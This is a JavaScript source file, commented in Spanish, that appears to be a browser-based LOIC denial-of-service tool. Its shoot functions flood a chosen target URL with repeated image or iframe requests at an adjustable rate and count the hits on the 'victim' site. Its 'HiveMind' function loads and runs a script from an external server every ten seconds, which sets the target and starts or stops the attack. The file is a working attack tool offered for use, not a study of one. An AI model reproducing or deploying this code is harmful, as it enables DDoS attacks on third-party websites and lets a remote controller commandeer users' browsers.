//Variables globales.
//NOTA: mala costumbre que hay que corregir...
var fireInterval;
var shootID;
var typeValue = 'img';
var state = 'stop';
var shootRequest = {};

//Modifica la URL para que tenga "http://" al principio.
function httpValue(){
    if ($('#target').val().substr(0,7) != "http://") {
        $('#target').val('http://'+$('#target').val());
    }
    if ($('#hiveURL').val().substr(0,7) != "http://") {
        $('#hiveURL').val('http://'+$('#hiveURL').val());
    }
}

//Modifica la URL para a�adir los arrays.
function arrayValue(url,type){
    if (type == 'target'){
        if (/\?/.test(url)){
            return '&LOWC=';
        }
        else {
            return '?LOWC=';
        }
    }
    else {
        if (/\?/.test(url)){
            return '&ID=';
        }
        else {
            return '?ID=';
        }
    }
}

//Modifica la cadencia cuando cambia el valor del slide.
function move_slide(){
    if (state == 'stop'){
        return;
    }
    preshoot($('#sl0').mbgetVal());
}

//Controla el bot�n de ataque.
function start_stop(){
    if (state == 'stop'){
    $('#counter_requested').html('0');
    $('#counter_tail').html('0');
        state = 'start';
        $('#start').val('Stop the Terror!');
        preshoot($('#sl0').mbgetVal());
    }
    else {
        state = 'stop';
        $('#start').val('Charging Laser...');
        clearInterval(fireInterval);
    }
}

//Cambia el estilo del bot�n dependiendo de la opci�n deseada.
function shootType(type){
    $('#counter_requested').html('0');
    $('#counter_tail').html('0');
    if (type == 'img'){
        $('#typeStyle').html('<style>#radio1{border-color:#5696C0;} #radio2{border-color:#000000;} #interval2{display:none;} #counter_tail,#of{visibility:visible;}</style>');
        typeValue = 'img';
        $('#sl0').mbsetVal(5);
    }
    else {
        $('#typeStyle').html('<style>#radio2{border-color:#5696C0;} #radio1{border-color:#000000;} #counter_tail,#of{visibility:hidden;}</style>');
        typeValue = 'iframe';
        $('#sl0').mbsetVal(50);
    }
    move_slide();
}

//Variables de ataque.
//El array aleatorio ID que se carga con la URL es para evitar que Javascript
//use la cach� del navegador y vuelva a descargar el archivo.
//---------------------------
//Petici�n mediante imagen.
var shoot1 = function () {
    var targetURL = $('#target').val();
    var msg = $('#msg').val();
    var shootID = Number(new Date());
    var resource = document.createElement('img');
    resource.setAttribute('src',targetURL+arrayValue(targetURL,'target')+msg+'&ID='+Number(new Date()));
    resource.setAttribute('onload','score_requested('+shootID+')'); //A no ser que el objetivo sea una im�gen siempre
    resource.setAttribute('onabort','score_requested('+shootID+')'); //va a dar error, pero mientras obtenga una
    resource.setAttribute('onerror','score_requested('+shootID+')'); //una respuesta del servidor me vale.
    resource.setAttribute('id',shootID);
    $('#imgContainer').append(resource);
    score_tail();
}

//Petici�n mediante IFrame.
var shoot2 = function () {
    var targetURL = $('#target').val();
    var msg = $('#msg').val();
    var shootID = Number(new Date());
    var resource = document.createElement('iframe');
    resource.setAttribute('src',targetURL+arrayValue(targetURL,'target')+msg+'&ID='+Number(new Date()));
    resource.setAttribute('onload','score_requested('+shootID+')');
    resource.setAttribute('id',shootID);
    $('#frameContainer').append(resource);
    score_tail();
}
//---------------------------

//Invoca un intervalo de la variable de ataque deseada.
function preshoot(interval){
    if (typeValue == 'img'){
        clearInterval(fireInterval);
        fireInterval = setInterval(shoot1,interval)
    }
    else {
        clearInterval(fireInterval);
        fireInterval = setInterval(shoot2,interval)
    }
}

//Ciclos del intervalo efectuados.
function score_tail(){
    $('#counter_tail')[0].innerHTML++
}

//Cargas completas de la web v�ctima efectuadas.
function score_requested(shootID){
    $('#counter_requested')[0].innerHTML++
    $('#'+shootID).remove();
}

//Controla el bot�n del HiveMind.
function hive(){
    if ($('#hivebutton').val() == 'Connect'){
        $('#hivebutton').val('Disconnect');
        load_hive();
    }
    else {
        $('#hivebutton').val('Connect');
    }
}

//Carga el HiveMind desde un servidor externo.
//El array aleatorio ID que se carga con la URL es para evitar que Javascript
//use la cach� del navegador y vuelva a descargar el archivo.
function load_hive(){
    if ($('#hivebutton').val() == 'Disconnect'){
        var hiveURL = $('#hiveURL').val();
        var hiveID = Number(new Date());
        var hiveScript = document.createElement('script');
        hiveScript.setAttribute('type','text/javascript'),
        hiveScript.setAttribute('src',hiveURL+arrayValue(hiveURL,'hive')+hiveID);
        hiveScript.setAttribute('onload','change_hive('+hiveID+');');
        hiveScript.setAttribute('onabort','change_hive('+hiveID+');');
        hiveScript.setAttribute('onerror','change_hive('+hiveID+');');
        hiveScript.setAttribute('id',hiveID);
        document.getElementById('hiveContainer').appendChild(hiveScript);
        setTimeout('load_hive();',10000);
    }
}

//Cambia los valores obtenidos en change_hive().
function change_hive(hiveID){
    $('#target').val(info.target);
    $('#msg').val(info.msg);
    if (info.status == 'start') {
        state = 'stop';
        start_stop();
    }
    else {
        state = 'start';
        start_stop();
    }
    $('#'+hiveID).remove();
}

//Elimina el valor "http://" al obtener el foco.
function erase(id){
    if ($(id).val() == 'http://'){
        $(id).val('');
    }
}

//Restaura el valor "http://" al perder el foco.
function reload(id){
    if ($(id).val() == ''){
        $(id).val('http://');
    }
}
